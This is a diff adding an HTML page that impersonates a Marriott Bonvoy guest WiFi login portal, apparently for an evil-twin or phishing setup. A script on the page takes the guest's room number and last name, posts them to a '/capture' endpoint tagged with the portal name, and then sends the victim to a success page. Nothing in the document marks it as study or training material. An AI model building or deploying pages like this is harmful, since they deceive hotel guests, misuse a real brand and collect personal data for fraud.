@@ -1,0 +1,59 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Marriott Guest WiFi</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { font-family: Arial, sans-serif; background: linear-gradient(135deg, #8b0000 0%, #b8860b 100%); display: flex; justify-content: center; align-items: center; min-height: 100vh; padding: 20px; }
+        .container { background: white; border-radius: 10px; box-shadow: 0 10px 30px rgba(0,0,0,0.3); max-width: 400px; width: 100%; padding: 40px 30px; }
+        .logo { text-align: center; margin-bottom: 30px; }
+        .logo h1 { color: #8b0000; font-size: 32px; font-weight: bold; }
+        .logo p { color: #b8860b; font-size: 14px; margin-top: 5px; }
+        h2 { color: #333; text-align: center; margin-bottom: 25px; font-size: 20px; }
+        .form-group { margin-bottom: 20px; }
+        label { display: block; margin-bottom: 8px; color: #555; font-weight: 500; }
+        input { width: 100%; padding: 12px; border: 2px solid #ddd; border-radius: 5px; font-size: 14px; }
+        input:focus { outline: none; border-color: #8b0000; }
+        button { width: 100%; padding: 14px; background: #8b0000; color: white; border: none; border-radius: 5px; font-size: 16px; font-weight: bold; cursor: pointer; }
+        button:hover { background: #700000; }
+        .footer { text-align: center; margin-top: 20px; color: #888; font-size: 12px; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="logo">
+            <h1>MARRIOTT</h1>
+            <p>BONVOY GUEST NETWORK</p>
+        </div>
+        <h2>Guest WiFi Access</h2>
+        <form id="loginForm">
+            <div class="form-group">
+                <label>Room Number</label>
+                <input type="text" id="room" required placeholder="1234">
+            </div>
+            <div class="form-group">
+                <label>Last Name</label>
+                <input type="text" id="lastname" required placeholder="Smith">
+            </div>
+            <button type="submit">Connect</button>
+        </form>
+        <div class="footer">Marriott Bonvoy Secure Network</div>
+    </div>
+    <script>
+        document.getElementById('loginForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            const room = document.getElementById('room').value;
+            const lastname = document.getElementById('lastname').value;
+            console.log('[Marriott] Room:', room, 'Last Name:', lastname);
+            fetch('/capture', {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({portal: 'Marriott', room: room, lastname: lastname})
+            }).catch(err => console.log(err));
+            window.location.href = 'success.html';
+        });
+    </script>
+</body>
+</html>
